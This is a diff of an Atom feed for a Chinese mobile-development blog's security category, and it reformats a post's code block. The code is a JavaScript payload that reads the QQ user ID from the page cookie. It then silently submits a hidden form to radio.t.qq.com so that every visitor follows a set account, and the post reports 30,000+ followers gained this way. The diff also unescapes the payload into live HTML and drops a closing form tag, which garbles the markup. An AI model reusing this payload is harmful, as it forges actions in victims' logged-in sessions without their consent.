@@ -4,7 +4,7 @@
   <title><![CDATA[分类：security | 移动开发技术]]></title>
   <link href="http://jason5.cn/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2016-08-03T12:10:20+08:00</updated>
+  <updated>2016-08-03T12:11:11+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -36,18 +36,14 @@
 
 <p>格式化</p>
 
-<pre><code class="javascript">(function() {
-    window.u = "chunxi_lu";
-    window.mm = document.createElement("div");
-    window.mm.innerHTML = "&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;&lt;input type='hidden' value='" + window.u + "' name='u'/&gt;&lt;input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/&gt;&lt;/form&gt;";
+<p>```javascript
+(function() {
+    window.u = &ldquo;chunxi_lu&rdquo;;
+    window.mm = document.createElement(&ldquo;div&rdquo;);
+    window.mm.innerHTML = &ldquo;<iframe style='display:none' name='mj'></iframe><form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'><input type='hidden' value='" + window.u + "' name='u'/><input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/></form>&rdquo;;
     document.body.appendChild(window.mm);
-    document.getElementById("mi").submit();
-})()
-</code></pre>
-
-<p>innerHTML里的内容</p>
-
-<p>```javascript</p>
+    document.getElementById(&ldquo;mi&rdquo;).submit();
+})()</p>
 
 <iframe style='display:none' name='mj'></iframe>
 
@@ -55,7 +51,6 @@
 <p><form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'>
     <input type='hidden' value='" + window.u + "' name='u' />
     <input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin' />
-</form>
 ```</p>
 
 <p>粉丝数刷到3w+</p>
